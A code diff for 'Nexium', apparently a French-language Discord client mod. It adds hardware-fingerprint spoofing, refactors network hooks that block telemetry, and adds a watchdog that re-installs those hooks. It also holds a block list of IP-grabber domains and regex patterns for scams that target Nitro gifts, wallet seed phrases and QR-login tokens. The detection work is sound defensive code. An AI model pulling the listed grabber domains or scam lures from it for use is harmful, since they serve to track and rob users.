@@ -2818,15 +2818,30 @@ if(!opts||typeof opts!=="object")return opts;
 var o=_NXP.stripOut(opts);
 o=_NXP.maskNames(url,o);
 return o;}catch(_){return opts;}};
+_NXP.HWCLES=["hardwareConcurrency","deviceMemory","maxTouchPoints"];
+_NXP.HWVAL={hardwareConcurrency:8,deviceMemory:8,maxTouchPoints:0};
 _NXP.applyHardware=function(){try{
-if(_NXP._hw||!_NXP.cfg.spoofHardware)return;
+if(!_NXP.cfg.spoofHardware)return _NXP.unapplyHardware();
+if(_NXP._hw)return true;
+if(!_NXP._hwAvant){_NXP._hwAvant={};
+for(var z=0;z<_NXP.HWCLES.length;z++){var cz=_NXP.HWCLES[z];
+try{_NXP._hwAvant[cz]={d:Object.getOwnPropertyDescriptor(navigator,cz)||null,v:navigator[cz]};}catch(_){_NXP._hwAvant[cz]=null;}}}
+var n=0;
+for(var a2=0;a2<_NXP.HWCLES.length;a2++){var k2=_NXP.HWCLES[a2];
+try{Object.defineProperty(navigator,k2,{configurable:true,enumerable:true,get:(function(v){return function(){return v;};})(_NXP.HWVAL[k2])});n++;}catch(_){}}
+if(!n)return false;
 _NXP._hw=true;
-var pose=function(o,k,v){try{Object.defineProperty(o,k,{configurable:true,enumerable:true,get:function(){return v;}});}catch(_){}};
-pose(navigator,"hardwareConcurrency",8);
-pose(navigator,"deviceMemory",8);
-pose(navigator,"maxTouchPoints",0);
 _NXP.mark("hardware",true);
-_NXP.logBlocked("hardware","caracteristiques materielles normalisees");}catch(_){}};
+_NXP.logBlocked("hardware","caracteristiques materielles normalisees");return true;}catch(_){return false;}};
+_NXP.unapplyHardware=function(){try{
+if(!_NXP._hw)return false;
+for(var a3=0;a3<_NXP.HWCLES.length;a3++){var k3=_NXP.HWCLES[a3];
+var av=_NXP._hwAvant&&_NXP._hwAvant[k3];
+try{if(av&&av.d)Object.defineProperty(navigator,k3,av.d);
+else if(av)Object.defineProperty(navigator,k3,{configurable:true,enumerable:true,get:(function(v){return function(){return v;};})(av.v)});
+else delete navigator[k3];}catch(_){}}
+_NXP._hw=false;
+_NXP.logBlocked("hardware","masque materiel retire");return true;}catch(_){return false;}};
 _NXP.RXDISCICE=/discord(app)?\.(com|net|media|gg)/i;
 _NXP.wireRtc=function(){try{
 if(_NXP._rtc)return;_NXP._rtc=true;
@@ -2853,13 +2868,16 @@ _NXP.wireClip=function(){try{
 if(_NXP._clip)return;_NXP._clip=true;
 if(!navigator.clipboard||typeof navigator.clipboard.writeText!=="function")return;
 var ow=navigator.clipboard.writeText.bind(navigator.clipboard);
-navigator.clipboard.writeText=function(t){try{
+var pw=function(t){try{
 if(_NXP.cfg.cleanClipboard&&typeof t==="string"&&t.indexOf("http")>=0){
 var n=0;
 var t2=t.replace(/https?:\/\/[^\s<>"']+/g,function(u){try{var c=_NXP.cleanUrl(u);if(c!==u)n++;return c;}catch(_){return u;}});
 if(n){_NXP.mark("clip",true);_NXP.logBlocked("clip",n+" lien(s) copie(s) nettoye(s)");t=t2;}}}catch(_){}
-return ow(t);};}catch(_){}};
+return ow(t);};pw.__nx=true;navigator.clipboard.writeText=pw;}catch(_){}};
 _NXP.TRACES=["nexium_stats_v1","nexium_privacy_stats_v1","nexium_protect_v1_stats","nexium_gardes_v1_stats","nexium_errors","nexium_quarantine","nexium_reports"];
+_NXP.purgeApercu=function(){try{var n=0,o=0;
+for(var a=0;a<_NXP.TRACES.length;a++){try{var v=_NXDB.get(_NXP.TRACES[a]);if(v!==null){n++;o+=String(v).length;}}catch(_){}}
+return {n:n,octets:o,total:_NXP.TRACES.length};}catch(_){return {n:0,octets:0,total:0};}};
 _NXP.purgeTraces=function(force){try{
 if(!force&&!_NXP.cfg.purgeOnQuit)return 0;
 var n=0;
@@ -2928,13 +2946,79 @@ try{window.addEventListener("beforeunload",_NXP.saveStatsNow);}catch(_){}
 try{_NXP.applyHardware();_NXP.wireRtc();_NXP.wireClip();}catch(_){}
 try{_NXP.quietTick();setInterval(function(){try{_NXP.quietTick();}catch(_){}},60000);}catch(_){}
 try{window.addEventListener("beforeunload",function(){try{_NXP.purgeTraces();}catch(_){}});}catch(_){}
+try{window.addEventListener("pagehide",function(){try{_NXP.purgeTraces();}catch(_){}});}catch(_){}
+try{document.addEventListener("visibilitychange",function(){try{if(document.hidden)_NXP.purgeTraces();}catch(_){}});}catch(_){}
 try{document.addEventListener("visibilitychange",function(){if(document.hidden)_NXP.saveStatsNow();});}catch(_){}
-try{(function(){if(window.fetch&&!window.fetch.__nx){var _of=window.fetch.bind(window);var pf=function(input,opts){try{var url=typeof input==="string"?input:(input&&input.url)?input.url:"";if(url&&window._NXV&&_NXV.checkOut(url,opts||(input&&typeof input==="object"?input:null),"requete"))return Promise.resolve(new Response("",{status:403,statusText:"Blocked by Nexium"}));
-if(url&&_NXP.shouldBlock(url))return Promise.resolve(new Response("",{status:204,statusText:"No Content"}));if(url)opts=_NXP.prepare(url,opts);}catch(_){}return _of(input,opts);};pf.__nx=true;window.fetch=pf;}})();}catch(_){}
-try{(function(){if(navigator.sendBeacon&&!navigator.sendBeacon.__nx){var _ob=navigator.sendBeacon.bind(navigator);var pb=function(url,data){try{if(url&&window._NXV&&_NXV.checkOut(url,{body:data},"balise"))return true;if(url&&_NXP.shouldBlock(url))return true;}catch(_){}return _ob(url,data);};pb.__nx=true;navigator.sendBeacon=pb;}})();}catch(_){}
-try{(function(){if(window.XMLHttpRequest&&!window.XMLHttpRequest.prototype.__nx){var _open=window.XMLHttpRequest.prototype.open;var _send=window.XMLHttpRequest.prototype.send;window.XMLHttpRequest.prototype.open=function(m,u){try{this.__nxurl=u;this.__nxh={};}catch(_){}return _open.apply(this,arguments);};
-var _srh=window.XMLHttpRequest.prototype.setRequestHeader;
-window.XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{if(this.__nxh)this.__nxh[k]=v;}catch(_){}return _srh.apply(this,arguments);};window.XMLHttpRequest.prototype.send=function(b){try{if(this.__nxurl&&window._NXV&&_NXV.checkOut(this.__nxurl,{body:b,headers:this.__nxh},"XHR"))return;if(this.__nxurl&&_NXP.shouldBlock(this.__nxurl))return;}catch(_){}return _send.apply(this,arguments);};window.XMLHttpRequest.prototype.__nx=true;}})();}catch(_){}
+_NXP.GARDES=["fetch","beacon","xhr","ws","rtc","clip"];
+_NXP.repose=0;_NXP.tombees=[];
+_NXP.vide=function(){try{return new Response(null,{status:204,statusText:"Blocked by Nexium"});}
+catch(_){try{return new Response("",{status:200,statusText:"Blocked by Nexium",headers:{"x-nexium":"bloque"}});}catch(__){return null;}}};
+_NXP.poseFetch=function(){try{
+if(!window.fetch||window.fetch.__nx)return !!(window.fetch&&window.fetch.__nx);
+var _of=window.fetch.bind(window);
+var pf=function(input,opts){try{
+if(_NXP._dans)return _of(input,opts);
+var url=typeof input==="string"?input:(input&&input.url)?input.url:"";
+if(url){_NXP._dans=true;
+try{if(window._NXV&&_NXV.checkOut(url,opts||(input&&typeof input==="object"?input:null),"requete")){_NXP._dans=false;return Promise.resolve(new Response("",{status:403,statusText:"Blocked by Nexium"}));}
+if(_NXP.shouldBlock(url)){_NXP._dans=false;return Promise.resolve(_NXP.vide());}
+opts=_NXP.prepare(url,opts);}finally{_NXP._dans=false;}}}catch(_){_NXP._dans=false;}
+return _of(input,opts);};
+pf.__nx=true;window.fetch=pf;return true;}catch(_){return false;}};
+_NXP.poseBeacon=function(){try{
+if(!navigator.sendBeacon||navigator.sendBeacon.__nx)return !!(navigator.sendBeacon&&navigator.sendBeacon.__nx);
+var _ob=navigator.sendBeacon.bind(navigator);
+var pb=function(url,data){try{if(url&&window._NXV&&_NXV.checkOut(url,{body:data},"balise"))return true;if(url&&_NXP.shouldBlock(url))return true;}catch(_){}return _ob(url,data);};
+pb.__nx=true;navigator.sendBeacon=pb;return true;}catch(_){return false;}};
+_NXP.poseXhr=function(){try{
+if(!window.XMLHttpRequest||window.XMLHttpRequest.prototype.__nx)return !!(window.XMLHttpRequest&&window.XMLHttpRequest.prototype.__nx);
+var X=window.XMLHttpRequest.prototype;
+var _open=X.open,_send=X.send,_srh=X.setRequestHeader;
+X.open=function(m,u){try{this.__nxurl=u;this.__nxh={};}catch(_){}return _open.apply(this,arguments);};
+X.setRequestHeader=function(k,v){try{if(this.__nxh)this.__nxh[k]=v;}catch(_){}return _srh.apply(this,arguments);};
+X.send=function(b){try{if(this.__nxurl&&window._NXV&&_NXV.checkOut(this.__nxurl,{body:b,headers:this.__nxh},"XHR"))return;if(this.__nxurl&&_NXP.shouldBlock(this.__nxurl))return;}catch(_){}return _send.apply(this,arguments);};
+X.__nx=true;return true;}catch(_){return false;}};
+_NXP.poseWs=function(){try{
+var W0=window.WebSocket;
+if(!W0||W0.__nx)return !!(W0&&W0.__nx);
+var W=function(url,proto){
+try{var u=String(url||"");
+if(u&&!_NXP.RXDISCICE.test(u)&&_NXP.classify(u)&&_NXP.shouldBlock(u)){_NXP.logBlocked("ws",u);throw new Error("Blocked by Nexium");}}catch(e){if(e&&e.message==="Blocked by Nexium")throw e;}
+return (arguments.length>1)?new W0(url,proto):new W0(url);};
+try{W.prototype=W0.prototype;}catch(_){}
+try{W.CONNECTING=0;W.OPEN=1;W.CLOSING=2;W.CLOSED=3;}catch(_){}
+W.__nx=true;window.WebSocket=W;return true;}catch(_){return false;}};
+_NXP.poseReseau=function(){try{
+var etat={fetch:_NXP.poseFetch(),beacon:_NXP.poseBeacon(),xhr:_NXP.poseXhr(),ws:_NXP.poseWs()};
+try{_NXP.wireRtc();etat.rtc=!!(window.RTCPeerConnection&&window.RTCPeerConnection.__nxp);}catch(_){etat.rtc=false;}
+try{_NXP.wireClip();etat.clip=!!(navigator.clipboard&&navigator.clipboard.writeText&&navigator.clipboard.writeText.__nx);}catch(_){etat.clip=false;}
+_NXP.etatGardes=etat;return etat;}catch(_){return {};}};
+_NXP.gardesTombees=function(){try{
+var t=[];
+if(window.fetch&&!window.fetch.__nx)t.push("fetch");
+if(navigator.sendBeacon&&!navigator.sendBeacon.__nx)t.push("beacon");
+if(window.XMLHttpRequest&&!window.XMLHttpRequest.prototype.__nx)t.push("xhr");
+if(window.WebSocket&&!window.WebSocket.__nx)t.push("ws");
+if(window.RTCPeerConnection&&!window.RTCPeerConnection.__nxp)t.push("rtc");
+return t;}catch(_){return [];}};
+_NXP.sentinelle=function(){try{
+var t=_NXP.gardesTombees();
+if(!t.length)return 0;
+_NXP._rtc=false;_NXP._clip=false;
+_NXP.poseReseau();
+var reste=_NXP.gardesTombees();
+var repris=t.length-reste.length;
+if(repris>0){
+_NXP.repose+=repris;
+_NXP.tombees.unshift({t:Date.now(),q:t.join(", ")});
+if(_NXP.tombees.length>20)_NXP.tombees.pop();
+try{if(window._NXERR){_NXERR.push("sentinelle :: garde(s) remise(s) en place : "+t.join(", "));if(window._NXsaveErr)_NXsaveErr();}}catch(_){}
+try{if(window._NXPR&&_NXPR.toast)_NXPR.toast("Une protection reseau de Nexium avait ete ecrasee ("+t.join(", ")+"). Elle vient d etre remise en place.",2);}catch(_){}
+_NXP.tnotify();}
+return repris;}catch(_){return 0;}};
+try{_NXP.poseReseau();}catch(_){}
+try{setInterval(function(){try{if(!document.hidden)_NXP.sentinelle();}catch(_){}},45000);}catch(_){}
+try{document.addEventListener("visibilitychange",function(){try{if(!document.hidden)_NXP.sentinelle();}catch(_){}});}catch(_){}
 }catch(_nxE){try{window._NXFAIL=window._NXFAIL||[];_NXFAIL.push("_NXP");if(window._NXERR)_NXERR.push("module _NXP :: "+((_nxE&&_nxE.message)||"erreur"));console.warn("[Nexium] _NXP desactive:",_nxE);}catch(_){}}
 }var _NXNET=window._NXNET||(window._NXNET={});
 if(!_NXNET.boot){_NXNET.boot=true;_NXNET.samples=[];_NXNET.count=0;_NXNET.conn=[];_NXNET.listeners=[];
@@ -3161,6 +3245,67 @@ var PV_GROUPES=[["Telemetrie","Ce que Discord mesure sur ton usage.",PV_TELE],
 ["Signaux sociaux","Ce que les autres et le serveur apprennent de ton comportement.",PV_SOCIAL],
 ["Empreinte et identite","Ce qui permet de te reconnaitre d une session a l autre.",PV_EMPREINTE],
 ["Donnees et traces","Ce que tu emportes avec toi, ou laisses derriere.",PV_DONNEES]];
+function NexiumPreuveComp(p){
+var g=(p&&p.g)||null;
+var force=F.useReducer(function(x){return x+1;},0)[1];
+F.useEffect(function(){
+var vivant=true;
+var maj=function(){try{if(vivant)force();}catch(_){}};
+_NXPRV.listeners.push(maj);
+return function(){vivant=false;
+try{_NXPRV.listeners=_NXPRV.listeners.filter(function(f){return f!==maj;});}catch(_){}};},[]);
+var P=_NXpal;
+var L=[];
+for(var a=0;a<_NXPRV.T.length;a++){if(!g||_NXPRV.T[a].g===g)L.push(_NXPRV.T[a]);}
+var n=_NXPRV.compte(g);
+var lance=_NXPRV.encours;
+var jamais=(n.agit+n.echec+n.coupe+n.na)===0;
+var TON={agit:{c:P.ok,l:_T("agit")},echec:{c:_NXpal.red,l:_T("n agit pas")},coupe:{c:P.sub,l:_T("eteint")},na:{c:P.faint,l:_T("hors sujet")}};
+function pastille(etat){
+var t=TON[etat];
+if(!t)return i("div",{style:{fontSize:"10px",fontWeight:"800",letterSpacing:".12em",textTransform:"uppercase",color:P.faint,whiteSpace:"nowrap"}},lance?_T("en cours"):_T("non teste"));
+return i("div",{style:{display:"flex",alignItems:"center",gap:"6px",whiteSpace:"nowrap"}},
+i("div",{"aria-hidden":"true",style:{width:"7px",height:"7px",borderRadius:"50%",background:t.c,boxShadow:"0 0 8px "+t.c+"55"}}),
+i("div",{style:{fontSize:"10px",fontWeight:"800",letterSpacing:".12em",textTransform:"uppercase",color:t.c}},t.l));}
+function ligne(e,dernier){
+var r=_NXPRV.res[e.id];
+var etat=r&&r.etat;
+return i("div",{key:e.id,style:{display:"flex",alignItems:"flex-start",justifyContent:"space-between",gap:"14px",
+padding:"13px 0",borderBottom:dernier?"none":"1px solid "+P.line}},
+i("div",{style:{flex:1,minWidth:0}},
+i("div",{style:{fontSize:"13px",fontWeight:"700",color:etat==="echec"?_NXpal.danger:P.pale,letterSpacing:"-.01em"}},_T(e.t)),
+i("div",{style:{fontSize:"11.5px",color:P.dim,lineHeight:1.6,marginTop:"4px"}},_T(e.d)),
+r&&r.det?i("div",{style:{fontFamily:_NXf.mono,fontSize:"10.5px",color:etat==="echec"?_NXpal.dangerSoft:P.sub,
+lineHeight:1.6,marginTop:"7px",padding:"8px 10px",borderRadius:"8px",background:P.inset,
+border:"1px solid "+(etat==="echec"?"#3a2626":P.line),wordBreak:"break-word"}},r.det):null),
+pastille(etat));}
+var resume;
+if(jamais&&!lance)resume=_T("Rien n est affiche tant que rien n a ete verifie. Appuie sur le bouton : chaque ligne execute la vraie protection sur du vrai contenu, et affiche ce qui s est reellement passe.");
+else if(lance)resume=_T("Verification en cours")+" "+_NXPRV.fini+"/"+(_NXPRV.total||L.length);
+else{
+var bouts=[];
+if(n.agit)bouts.push(n.agit+" "+_T("agissent"));
+if(n.echec)bouts.push(n.echec+" "+_T("n agissent pas"));
+if(n.coupe)bouts.push(n.coupe+" "+_T("eteintes dans tes reglages"));
+if(n.na)bouts.push(n.na+" "+_T("hors sujet ici"));
+resume=bouts.join(" - ")+(_NXPRV.duree?(" - "+_T("verifie en")+" "+(Math.round(_NXPRV.duree/100)/10)+" s"):"");}
+var barre=null;
+if(!jamais||lance){
+var tot=L.length||1;
+var seg=function(v,c,k){return v?i("div",{key:k,"aria-hidden":"true",style:{width:(v/tot*100)+"%",background:c,transition:"width .5s cubic-bezier(.22,.8,.28,1)"}}):null;};
+barre=i("div",{style:{display:"flex",height:"8px",borderRadius:"99px",overflow:"hidden",background:P.line,marginBottom:"16px"}},
+seg(n.agit,P.ok,"a"),seg(n.echec,_NXpal.red,"e"),seg(n.coupe,P.mute,"c"),seg(n.na,P.faint,"n"));}
+return _NXcard(i("div",null,
+_NXch(_T("Banc de preuve"),
+_T("Nexium ne se contente pas de dire qu il protege : il le fait devant toi. Aucun de ces resultats n est simule."),
+_NXbtn(lance?_T("Verification en cours"):(jamais?_T("Verifier maintenant"):_T("Relancer")),function(){
+if(_NXPRV.encours)return;
+_NXPRV.lance(g,function(c){try{if(window._NXPR&&_NXPR.toast)_NXPR.toast(c.echec?(c.echec+" "+_T("protection(s) ne repondent pas. Ouvre le banc de preuve.")):_T("Toutes les protections actives ont repondu."),c.echec?0:1);}catch(_){}});
+force();})),
+barre,
+i("div",{style:{fontSize:"12px",color:P.sub,lineHeight:1.65,marginBottom:jamais&&!lance?"0":"6px"}},resume),
+i("div",null,L.map(function(e,k){return ligne(e,k===L.length-1);}))),{mb:14});
+}
 function NexiumPrivacyComp(){
 var force=F.useReducer(function(x){return x+1;},0)[1];
 var _t0=F.useState("apercu");var tab=_t0[0];var setTab=_t0[1];
@@ -3242,7 +3387,7 @@ var n=0;for(var a=0;a<L.length;a++)if(cfg[L[a].k])n++;
 return _NXcard(i("div",null,
 _NXch(_T(nom),_T(desc),i("span",{style:{fontFamily:_NXf.mono,fontSize:"11px",color:n?col:P.faint,whiteSpace:"nowrap"}},n+"/"+L.length)),
 L.map(function(it,k){return ligne(it,k===L.length-1);})),{mb:12});}
-var TABS=[["apercu","Aperçu"],["reglages","Réglages"],["journal","Journal"],["serveurs","Serveurs"]];
+var TABS=[["apercu","Aperçu"],["reglages","Réglages"],["preuve","Preuve"],["journal","Journal"],["serveurs","Serveurs"]];
 function tabbar(){return i("div",{role:"tablist","aria-label":_T("Sections de Nexium Privacy"),
 style:{display:"flex",borderBottom:"1px solid "+P.line,marginBottom:"18px",overflowX:"auto",position:"relative"}},
 TABS.map(function(t){var on=tab===t[0];
@@ -3472,7 +3617,7 @@ return i(Kr,null,i("div",{style:{maxWidth:"660px",margin:"0 auto"}},
 _NXhead(_T("Confidentialité"),"Nexium Privacy",_T("Ce que ton client transmet, et ce qu il cesse de transmettre. Tout est intercepte localement : fetch, XHR, balises et evenements internes.")),
 tabbar(),
 i("div",{key:tab,"data-nx-panel":"1"},
-tab==="apercu"?tApercu():tab==="reglages"?tReglages():tab==="journal"?tJournal():tServeurs()),
+tab==="apercu"?tApercu():tab==="reglages"?tReglages():tab==="preuve"?i(NexiumPreuveComp,{g:"privacy"}):tab==="journal"?tJournal():tServeurs()),
 _NXfoot("Nexium Privacy · interception locale, aucune donnée envoyée")));
 }
 
@@ -4370,7 +4515,7 @@ var _NXUP=window._NXUP||(window._NXUP={});
 if(!_NXUP.boot){_NXUP.boot=true;
 _NXUP.COMPAT='registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord" registrar:"NanoCord"';
 _NXUP.compatOk=function(){try{return (String(_NXUP.COMPAT).match(/registrar:"NanoCord"/g)||[]).length>=10;}catch(_){return false;}};
-_NXUP.APPLIED="__NEXIUM_APPLIED_SHA__";_NXUP.VERSION="174";_NXUP.repoVersion=null;
+_NXUP.APPLIED="__NEXIUM_APPLIED_SHA__";_NXUP.VERSION="175";_NXUP.repoVersion=null;
 _NXUP.KEY="nexium_update_v1";
 _NXUP.SLUG="Omega-devj/nexium-client";
 
@@ -5192,7 +5337,7 @@ if(typeof d.cryptoGuard!=="boolean")d.cryptoGuard=true;
 if(typeof d.dmLinkGuard!=="boolean")d.dmLinkGuard=false;
 if(typeof d.leakGuard!=="boolean")d.leakGuard=true;
 if(typeof d.raidGuard!=="boolean")d.raidGuard=true;
-if(typeof d.nameGuard!=="boolean")d.nameGuard=true;if(typeof d.qrLoginGuard!=="boolean")d.qrLoginGuard=true;if(typeof d.passkeyGuard!=="boolean")d.passkeyGuard=true;
+if(typeof d.nameGuard!=="boolean")d.nameGuard=true;if(typeof d.maskLinks!=="boolean")d.maskLinks=true;if(typeof d.maskSuspect!=="boolean")d.maskSuspect=false;if(typeof d.qrLoginGuard!=="boolean")d.qrLoginGuard=true;if(typeof d.passkeyGuard!=="boolean")d.passkeyGuard=true;
 return d;})();
 _NXPR.reload=function(){try{var r=_NXDB.get(_NXPR.KEY);if(r)_NXPR.cfg=JSON.parse(r);var s=_NXDB.get(_NXPR.KEY+"_stats");if(s)_NXPR.stats=JSON.parse(s);_NXPR.notify();}catch(_){}};
 _NXPR.saveCfg=function(){try{_NXDB.set(_NXPR.KEY,JSON.stringify(_NXPR.cfg));}catch(_){}};_NXPR.saveCfg();
@@ -5232,7 +5377,7 @@ bb.textContent=n+" personnes ont deja signale ce lien.";
 if(card&&card.appendChild)card.appendChild(bb);}catch(_){}};
 if(cl.comm&&cl.comm>=2)_sh(cl.comm);else _NXV.askHost(cl.host,_sh);}}catch(_){}
 }catch(_){}};
-_NXPR.toast=function(m,type){try{var C=_NXcommon().C;if(C&&C.Toasts)C.Toasts.show({message:m,id:C.Toasts.genId(),type:(type!=null?type:2),options:{position:C.Toasts.Position?C.Toasts.Position.BOTTOM:1}});}catch(_){}};
+_NXPR.TOASTCSS=["@keyframes nxAvIn{from{opacity:0;transform:translate3d(0,14px,0) scale(.97)}to{opacity:1;transform:none}}","@keyframes nxAvOut{from{opacity:1;transform:none}to{opacity:0;transform:translate3d(0,10px,0) scale(.98)}}","#nx-avert{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);z-index:99998;","display:flex;flex-direction:column;align-items:center;gap:8px;pointer-events:none;max-width:min(560px,calc(100vw - 40px))}","#nx-avert .nx-av{pointer-events:auto;display:flex;align-items:flex-start;gap:11px;padding:12px 15px;border-radius:13px;","background:rgba(14,14,17,.97);border:1px solid #26262b;box-shadow:0 18px 44px rgba(0,0,0,.5);","font-size:12.5px;line-height:1.55;color:#e4e4e8;animation:nxAvIn .34s cubic-bezier(.16,1,.3,1) both;cursor:pointer}","#nx-avert .nx-av.nx-out{animation:nxAvOut .22s ease forwards}","#nx-avert .nx-av i{flex-shrink:0;width:7px;height:7px;border-radius:50%;margin-top:6px;background:#8a8a92}","#nx-avert .nx-av.nx-d i{background:#d6484a}#nx-avert .nx-av.nx-d{border-color:#3a2626}","#nx-avert .nx-av.nx-w i{background:#e6c48a}#nx-avert .nx-av.nx-o i{background:#8fd19e}","#nx-avert .nx-av b{display:block;font-size:9.5px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;color:#6c6c74;margin-bottom:3px}","@media (prefers-reduced-motion: reduce){#nx-avert .nx-av{animation:none}}"].join("");_NXPR.toastDom=function(m,type){try{if(!document||!document.body)return false;if(!document.getElementById("nx-avert-style")){var st=document.createElement("style");st.id="nx-avert-style";st.textContent=_NXPR.TOASTCSS;(document.head||document.body).appendChild(st);}var box=document.getElementById("nx-avert");if(!box){box=document.createElement("div");box.id="nx-avert";box.setAttribute("role","status");box.setAttribute("aria-live","polite");document.body.appendChild(box);}while(box.childNodes.length>3){try{box.removeChild(box.firstChild);}catch(_){break;}}var cls=(type===0)?"nx-d":(type===1?"nx-o":(type===2?"nx-w":"nx-w"));var el=document.createElement("div");el.className="nx-av "+cls;var pt=document.createElement("i");el.appendChild(pt);var txt=document.createElement("div");var tit=document.createElement("b");tit.textContent=(type===0)?"Nexium - danger":"Nexium";txt.appendChild(tit);var cor=document.createElement("span");cor.textContent=String(m||"");txt.appendChild(cor);el.appendChild(txt);var vif=(type===0);var pars=function(){try{if(el.parentNode){el.className+=" nx-out";setTimeout(function(){try{if(el.parentNode)el.parentNode.removeChild(el);}catch(_){}},230);}}catch(_){}};el.onclick=pars;box.appendChild(el);setTimeout(pars,vif?12000:6500);_NXPR.toastVoie="nexium";_NXPR.toastN=(_NXPR.toastN||0)+1;_NXPR.toastLast=Date.now();return true;}catch(_){return false;}};_NXPR.toastDiscord=function(m,type){try{var C=_NXcommon().C;if(!C||!C.Toasts||typeof C.Toasts.show!=="function"||typeof C.Toasts.genId!=="function")return false;C.Toasts.show({message:m,id:C.Toasts.genId(),type:(type!=null?type:2),options:{position:C.Toasts.Position?C.Toasts.Position.BOTTOM:1}});_NXPR.toastVoie="discord";_NXPR.toastN=(_NXPR.toastN||0)+1;_NXPR.toastLast=Date.now();return true;}catch(_){return false;}};_NXPR.toast=function(m,type){try{if(window._NXPRV&&_NXPRV.muet){_NXPRV.avertis.push(String(m));return true;}}catch(_){}try{if(_NXPR.toastForce!=="dom"&&_NXPR.toastDiscord(m,type))return true;}catch(_){}try{return _NXPR.toastDom(m,type);}catch(_){}try{console.warn("[Nexium]",m);}catch(_){}return false;};
 _NXPR.GRABBERS=["grabify.link","grabify.icu","grabify","iplogger.org","iplogger.com","iplogger.ru","iplogger.co","iplogger.io","iplogger.info","iploggers.com","2no.co","iplis.ru","yip.su","blasze.tk","blasze.com","ps3cfw.com","02ip.ru","ipgrabber.ru","ipgraber.ru","lovebird.guru","catsnthings.fun","catsnthing.com","dogesec.com","curiouscat.club","joinmy.site","bmwforum.co","leancoding.co","spottyfly.com","stopify.co","yotoo.co","gaming-at-home.com","freegiftcards.co","screenshot.host","imgvid.com","imgur.com.re","quickmessage.us","trackurl.com","whatstheirip.com","urlto.me","urlz.fr","ipgrab.io","grabip.net","ipgun.net","ip-tracker.org","1o.gl","c.grabify.link","fortnight.space","fortnitchat.site","freegiftcards.co","headshot.monster","opple.info","1337.plus","ps5cfw.com","xn--iplogger","yandex-team.co","discörd.com","grabifyip.com"];
 _NXPR.SHORTENERS=["bit.ly","tinyurl.com","cutt.ly","rebrand.ly","is.gd","t.co","goo.gl","ow.ly","shorturl.at","rb.gy","tiny.cc","t.ly","short.io","soo.gd","clck.ru","v.gd","x.co","po.st","qr.ae","1url.com","adf.ly","shorte.st","bc.vc","linktr.ee","lnkd.in","tr.im","u.to","cutt.us","short.gy"];
 _NXPR.SCAM=[/free\s*nitro/i,/nitro\s*(gift|free|giveaway)/i,/discord\s*nitro.*(claim|free|gift)/i,/steam\s*(gift|community).*(nitro|free)/i,/claim\s*your\s*(free|prize|nitro|gift)/i,/(you|u)\s*(won|win)\s/i,/airdrop/i,/double\s*your\s*(crypto|btc|eth|money)/i,/(free|1000)\s*(robux|vbucks|v-bucks)/i,/@everyone.*(free|nitro|gift|claim)/i,/gift.*discord.*\/nitro/i,/verify.*(wallet|seed|phrase)/i,/(login|connect).*(qr|scan).*(discord|token)/i];
@@ -5247,8 +5392,8 @@ if(!h)return false;
 var L=_NXPR.cfg.allow||[];
 for(var a=0;a<L.length;a++){if(_NXPR.suffixe(h,L[a]))return true;}}catch(_){}
 return false;};
-_NXPR.allowHost=function(h){try{if(!h)return;if(!Array.isArray(_NXPR.cfg.allow))_NXPR.cfg.allow=[];if(_NXPR.cfg.allow.indexOf(h)<0)_NXPR.cfg.allow.push(h);_NXPR.cache=Object.create(null);_NXPR.cacheN=0;_NXPR.saveCfg();_NXPR.notify();}catch(_){}};
-_NXPR.unallowHost=function(h){try{_NXPR.cfg.allow=(_NXPR.cfg.allow||[]).filter(function(x){return x!==h;});_NXPR.cache=Object.create(null);_NXPR.cacheN=0;_NXPR.saveCfg();_NXPR.notify();}catch(_){}};
+_NXPR.allowHost=function(h){try{if(!h)return;if(!Array.isArray(_NXPR.cfg.allow))_NXPR.cfg.allow=[];if(_NXPR.cfg.allow.indexOf(h)<0)_NXPR.cfg.allow.push(h);_NXPR.cache=Object.create(null);_NXPR.cacheN=0;_NXPR.saveCfg();try{_NXPR.masqueRefaire();}catch(_){}_NXPR.notify();}catch(_){}};
+_NXPR.unallowHost=function(h){try{setTimeout(function(){try{_NXPR.masqueRefaire();}catch(_){}},0);_NXPR.cfg.allow=(_NXPR.cfg.allow||[]).filter(function(x){return x!==h;});_NXPR.cache=Object.create(null);_NXPR.cacheN=0;_NXPR.saveCfg();_NXPR.notify();}catch(_){}};
 _NXPR.removeThreat=function(idx){try{_NXPR.stats.recent.splice(idx,1);_NXPR.saveStats();_NXPR.notify();}catch(_){}};
 _NXPR.clearThreats=function(){try{_NXPR.stats.recent=[];_NXPR.saveStats();_NXPR.notify();}catch(_){}};
 _NXPR.BLOCKLIST_URL="https://raw.githubusercontent.com/Omega-devj/blacklist-url-nexium-client/refs/heads/main/blocklist.txt";
@@ -5436,9 +5581,9 @@ return {score:score,why:why};}catch(_){return {score:0,why:[]};}};
 var _NXPall={scanFiles:true,scanDownloads:true,scanInvites:true,scanImpostor:true,scanWaves:true,scanMasked:true,scanEmbeds:true,scanEdits:true,scanStatus:true,qrGuard:true,clipGuard:true,oauthGuard:true,schemeGuard:true,bidiGuard:true,ipGuard:true,codeGuard:true};
 var _NXPmin={scanFiles:true,scanDownloads:true,scanInvites:false,scanImpostor:false,scanWaves:false,scanMasked:true,scanEmbeds:false,scanEdits:false,scanStatus:false,qrGuard:true,clipGuard:false,oauthGuard:true,schemeGuard:true,bidiGuard:false,ipGuard:true,codeGuard:true};
 _NXPR.PROFILES={
-strict:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:true,warnAccounts:true,consoleGuard:true,heuristics:true,hThreshold:3,hBlock:true},_NXPall),
-equilibre:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:true,warnAccounts:true,consoleGuard:true,heuristics:true,hThreshold:5,hBlock:false},_NXPall),
-minimal:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:false,warnAccounts:false,consoleGuard:false,heuristics:false,hThreshold:6,hBlock:false},_NXPmin)};
+strict:Object.assign({scanLinks:true,blockGrabbers:true,phishGuard:true,scamAlerts:true,warnAccounts:true,consoleGuard:true,heuristics:true,hThreshold:3,hBlock:true,maskLinks:true,maskSuspect:true},_NXPall),
